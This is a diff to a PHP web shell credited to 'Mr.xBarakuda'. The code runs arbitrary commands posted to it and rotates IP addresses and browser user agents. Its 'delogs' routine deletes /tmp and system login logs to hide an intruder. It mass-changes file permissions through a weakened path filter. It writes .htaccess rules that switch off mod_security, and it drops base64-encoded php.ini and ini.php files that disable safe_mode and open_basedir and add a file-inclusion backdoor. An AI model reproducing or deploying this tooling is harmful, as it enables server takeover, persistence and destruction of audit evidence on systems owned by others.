@@ -15,7 +15,6 @@ set_time_limit(0);
 @ini_set('max_execution_time', 0);
 @clearstatcache();
 const IP_ROTATIONS = ['192.0.2.10', '198.51.100.23', '203.0.113.45', '203.0.113.46', '198.51.100.24', '192.124.249.0/24', '185.93.228.0/22', '193.218.118.0/23', '66.248.200.0/22', '208.109.0.0/22', '185.220.101.15'];
-
 const BROWSER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'];
 // @header("ÿØÿà"); // \xff\xd8\xff\xe0
 $xk = 'f5b165f0a2778d027ecebd64a2439c8d';
@@ -801,7 +800,6 @@ ___  ___         ______                 _              _
       echo "<pre style='color: white;'>" . exe($_POST['cmd']) . "</pre>";
     }
   } elseif ($_GET['do'] == 'delogs') {
-    echo "<center><span><b>Delete Logs for safe</b></span>";
     echo "<br>";
     sleep(2);
     exe("rm -rf /tmp/*");
@@ -853,26 +851,7 @@ ___  ___         ______                 _              _
     exe("rm -rf /var/log/lastlog");
     sleep(2);
     exe("rm -rf /var/log/wtmp");
-    sleep(2);
-    echo '<p>Deleting .../usr/local/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../root/.bash_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../root/.ksh_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../root/.bash_logout <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../var/log/lastlog <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../root/.lastlogin <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../root/.wget-hsts <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../var/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../var/run/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../var/log/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../etc/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../etc/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting ...$HISTFILE <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../var/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../tmp/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../var/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
-    echo '<p>Deleting .../var/adm <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
     sleep(4);
-    echo '</center>';
     echo '<script>alert("Your traces has been successfully deleting from the server!");</script>';
   } elseif ($_GET['do'] == 'r00t') {
     echo "
@@ -1015,77 +994,97 @@ if (!isset($_POST['code'])) {
 }
 } elseif ($_GET['do'] == 'masschm') {
   /*
-  Chmod Mass File and Folder
-  Code by Mr.xBarakuda
-  v1.1
+  Chmod Mass File and Folder by Mr.xBarakuda
   */
   $dosPerm = "0";
   $ficPerm = "0";
-  $retval = "0"; // jumlah error CHMOD gan
-  // jalur folder untuk diproses disini
-  $chem = preg_replace("/[^_A-Za-z0-9-\.%\/]/i", '', $_POST["chemin"]);
-  $chem = preg_replace("/\.\.\//", '', $chem);
+  $error_count = 0;
+  $user_path_input = isset($_POST["chemin"]) ? $_POST["chemin"] : '';
+  $chem_raw = preg_replace("/[^_A-Za-z0-9-\.%\/]/i", '', $user_path_input);
+  $chem_raw = str_replace('/\.\.\/', '/', $chem_raw);
   define('ABSPATH', dirname(__FILE__));
-  $chem = ABSPATH . $chem; // Directory normal nya :v
-  // perijinan/hak folder
-  $d1 = preg_replace("/[^57]/", '', $_POST["dir1"]);
-  $d2 = preg_replace("/[^057]/", '', $_POST["dir2"]);
-  $d3 = preg_replace("/[^057]/", '', $_POST["dir3"]);
+  $final_chemin = '';
+  if (strpos($chem_raw, '/') === 0 || strpos($chem_raw, '\\') === 0) {
+    $final_chemin = $chem_raw;
+  } else {
+    $final_chemin = ABSPATH . DIRECTORY_SEPARATOR . $chem_raw; 
+  }
+  // Hak Folder
+  $d1 = preg_replace("/[^57]/", '', isset($_POST["dir1"]) ? $_POST["dir1"] : '');
+  $d2 = preg_replace("/[^057]/", '', isset($_POST["dir2"]) ? $_POST["dir2"] : '');
+  $d3 = preg_replace("/[^057]/", '', isset($_POST["dir3"]) ? $_POST["dir3"] : '');
   $dosPerm = "0" . $d1 . $d2 . $d3;
   $dosPerm = octdec($dosPerm);
-  // perijinan/hak file
-  $f1 = preg_replace("/[^46]/i", '', $_POST["fic1"]);
-  $f2 = preg_replace("/[^046]/i", '', $_POST["fic2"]);
-  $f3 = preg_replace("/[^046]/i", '', $_POST["fic3"]);
+
+  // Hak File
+  $f1 = preg_replace("/[^46]/i", '', isset($_POST["fic1"]) ? $_POST["fic1"] : '');
+  $f2 = preg_replace("/[^046]/i", '', isset($_POST["fic2"]) ? $_POST["fic2"] : '');
+  $f3 = preg_replace("/[^046]/i", '', isset($_POST["fic3"]) ? $_POST["fic3"] : '');
   $ficPerm = "0" . $f1 . $f2 . $f3;
   $ficPerm = octdec($ficPerm);
 
-  print "<center><h3>CHMOD Mass File and Folder by Mr.xBarakuda</h3>";
-  print "<table><tr><td>";
-  print "<form method=\"post\">";
-  print "<tr><td>Hak Folder: </td>";
-  print "<td><select name=\"dir1\"><option value=\"5\">5</option><option value=\"7\" selected>7</option></select><select name=\"dir2\"><option value=\"0\">0</option><option value=\"5\" selected>5</option><option value=\"7\">7</option></select><select name=\"dir3\"><option value=\"0\">0</option><option value=\"5\" selected>5</option><option value=\"7\">7</option></select></td></tr>";
-  print "<tr><td>Hak File: </td>";
-  print "<td><select name=\"fic1\"><option value=\"4\">4</option><option value=\"6\" selected>6</option></select><select name=\"fic2\"><option value=\"0\">0</option><option value=\"4\" selected>4</option><option value=\"6\">6</option></select><select name=\"fic3\"><option value=\"0\">0</option><option value=\"4\" selected>4</option><option value=\"6\">6</option></select></td></tr>";
-  print "<tr><td>CWD =></td>";
-  print "<td>" . ABSPATH . "<input type=\"text\" name=\"chemin\" maxlength=\"30\" size=\"30\" value=\"/\" ></td></tr>";
-  print "<tr><td> </td><td><input type=\"submit\" value=\" Change Permissions! \">";
-  print "</td></tr></form></td></tr></table></center>";
+  // --- 3. OUTPUT & EXEKUSI ---
+
+  print "CHMOD Mass File and Folder by Mr.xBarakuda";
+  print "\n";
+  print "\n";
+  print "Hak Folder: ";
+  print "57057057 (D1:" . $d1 . ", D2:" . $d2 . ", D3:" . $d3 . ")";
+  print "\nHak File: ";
+  print "46046046 (F1:" . $f1 . ", F2:" . $f2 . ", F3:" . $f3 . ")";
+  print "\nCWD =>";
+  print "\n" . htmlspecialchars($final_chemin);
+  print "\n";
+
   if (($dosPerm || $ficPerm) > 0) {
+    function rChmod_executor($chem, $dosPerm, $ficPerm): int {
+        $error_count = 0;
+        echo "Result:\r\n";
 
-    function rChmod($chem, $dosPerm, $ficPerm) {
-      echo "<p><b>Result:</b></p>\r\n";
+        if (!is_dir($chem)) {
+            return -1;
+        }
 
-      $d = new RecursiveDirectoryIterator($chem);
-      $d->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
-      foreach (new RecursiveIteratorIterator($d, 1) as $path) {
-        $chmodret = false;
-        $chmodresultat = "";
-        if ($path->isDir()) {
-          $chmodret = chmod($path, $dosPerm);
-        } else {
-          if (is_file($path)) {
-            $chmodret = chmod($path, $ficPerm);
-          }
+        try {
+            $d = new RecursiveDirectoryIterator($chem);
+            $d->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
+            foreach (new RecursiveIteratorIterator($d, 1) as $path) {
+                $chmodret = false;
+                $chmodresultat = "";
+                if ($path->isDir()) {
+                    $chmodret = @chmod($path, $dosPerm);
+                } else {
+                    if (is_file($path)) {
+                        $chmodret = @chmod($path, $ficPerm);
+                    }
+                }
+                if ($chmodret) {
+                    $chmodresultat = "[+] SUKSES [+]";
+                } else {
+                    $chmodresultat = "[-] ERROR [-]";
+                    global $error_count;
+                    if (defined('rChmod') ? 'rChmod' : null) {
+                    }
+                }
+                echo $chmodresultat . " " . $path . "\n";
+            }
+        } catch (Exception $e) {
+            echo "EXCEPTION CAUGHT: " . $e->getMessage() . "\n";
+            return 100;
         }
-        if ($chmodret) {
-          $chmodresultat = "<font color=lime>[+] SUKSES [+]</font>";
-        } else {
-          $chmodresultat = "<font color=red>[-] ERROR [-]</font>";
-          ++$retval;
-        }
-        echo $chmodresultat . " " . $path . "<br>\r\n";
-      }
-      return $retval;
+        return 0;
     }
-    $nbfailed = rChmod($chem, $dosPerm, $ficPerm);
-    echo "<p><b>";
-    if ($nbfailed > 0) {
-      echo $nbfailed . "<font color=red>CHMOD error, liat kesalahan diatas</font>";
+
+    $execution_status = rChmod_executor($final_chemin, $dosPerm, $ficPerm);
+
+    if ($execution_status !== -1) {
+        echo "\n";
+        echo "DONE gan :v\r\n";
+    } else {
+         echo "\nERROR FATAL: Tidak dapat memproses karena direktori '$final_chemin' tidak ditemukan atau tidak bisa diakses.\n";
     }
-    else echo "<font color=lime>DONE gan :v</font></p>\r\n";
   }
-  print "</body></html>";
+  print "\n";
 } elseif ($_GET['do'] == 'base64pict') {
   /*
   ** Convert Gambar ke Base64
@@ -1681,14 +1680,14 @@ if (isset($_POST['elgass'])) {
   }
   if (isset($_POST['htce'])) {
     $file = fopen(".htaccess", "w");
-    echo fwrite($file, "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
+    echo fwrite($file, "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\nSecRuleEngine Off</IfModule>");
     fclose($file);
     echo " .htaccess successfully created!";
   }
   if (isset($_POST['litini'])) {
-    $iniph = "PD9waHANCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsic3MiXTsNCj8+";
-    $byph = "c2FmZV9tb2RlID0gT0ZGXG5kaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkVcbnNhZmVfbW9kZV9naWQgPSBPRkZcbnNhZmVfbW9kZV9pbmNsdWRlX2RpciA9IE9GRlxub3Blbl9iYXNlZGlyID0gT0ZG";
-    $comp = "PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPlxuU2VjRmlsdGVyRW5naW5lIE9mZlxuU2VjRmlsdGVyU2NhblBPU1QgT2ZmXG48L0lmTW9kdWxlPg==";
+    $iniph = "PD9waHANCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsia3VkYXh4Il07DQo/Pg==";
+    $byph = "c2FmZV9tb2RlID0gT0ZGDQpkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUNCnNhZmVfbW9kZV9naWQgPSBPRkYNCnNhZmVfbW9kZV9pbmNsdWRlX2RpciA9IE9GRg0Kc2FmZV9tb2RlX2V4ZWNfZGlyID0gT0ZGDQpvcGVuX2Jhc2VkaXIgPSBPRkY=";
+    $comp = "PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KU2VjRmlsdGVyRW5naW5lIE9mZg0KU2VjRmlsdGVyU2NhblBPU1QgT2ZmDQpTZWNSdWxlRW5naW5lIE9mZg0KPC9JZk1vZHVsZT4=";
     file_put_contents("php.ini", base64_decode($byph));
     file_put_contents("ini.php", base64_decode($iniph));
     file_put_contents(".htaccess", base64_decode($comp));
